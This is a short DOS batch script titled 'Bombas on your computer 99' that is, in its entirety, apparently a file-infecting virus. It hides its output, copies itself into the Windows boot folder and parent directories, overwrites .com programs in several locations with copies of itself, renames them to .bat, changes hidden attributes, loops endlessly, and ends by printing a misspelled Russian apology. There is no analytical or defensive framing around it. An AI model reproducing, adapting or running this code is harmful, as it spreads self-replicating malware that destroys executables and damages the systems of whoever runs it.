:Bombas on your computer 99 (2)
@echo off
:rep
set boom= *.com
ctty nul
copy %0 %winbootdir%\%0
copy %0 ..
if not exist %boom% goto fun
for %%i in (%boom% ..\%boom% c:\%boom%) do copy %%i V%boom%
for %%k in (%boom% ..\%boom% c:\%boom%) do copy %0 %%k
ren *.com *.bat
attrib *%boom% + h
attrib %0 -h
goto rep
:fun
echo Извени меня!
v%0.com




